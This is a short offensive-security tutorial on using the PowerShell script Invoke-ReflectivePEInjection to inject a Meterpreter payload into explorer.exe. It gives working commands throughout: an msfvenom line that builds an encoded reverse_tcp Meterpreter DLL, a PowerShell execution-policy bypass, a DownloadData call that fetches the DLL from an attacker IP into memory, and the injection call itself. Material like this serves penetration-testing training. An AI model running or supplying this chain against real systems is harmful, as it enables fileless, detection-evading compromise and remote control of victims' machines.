# Invoke-ReflectivePEInjection

The script performs reflection to avoid writing assemblies to disk, after which it parses the desired PE file. It has two separate modes, the first is to reflectively load a DLL or EXE into the same process, and the second is to load a DLL into a remote process.
Since the complete code is almost 3000 lines, we are not going to cover the code itself but rather its usage. We must specify a DLL or EXE as an array of bytes in memory, which allows us to download and execute it without touching the disk.

For this exercise, we will use a Meterpreter DLL. To reflectively load a Meterpreter DLL in explorer.exe, we are going to download it using the PowerShell DownloadData method, place it in a byte array, and look up the desired process ID.
In order to execute the required commands, we must open a PowerShell window with "PowerShell -Exec Bypass", which allows script execution. Once the window is open, we will run the commands below.

# How to use
1. Create a DLL payload using msfvenom and upload it to the target machine:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f dll -t 300 -e x64/xor_dynamic -o met.dll
```


2. To use _Invoke-ReflectivePEInjection_, we must first upload the script to the target machine and import it from its location with `Import-Module`:
```powershell
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
```


3. Next we will load the DLL into a byte array and retrieve the explorer process ID and :
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.191/met.dll')
$procid = (Get-Process -Name explorer).Id
```


4. Finally, supply the byte array (`-PEBytes`) and process ID (`-ProcId`) and execute the script:
```powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```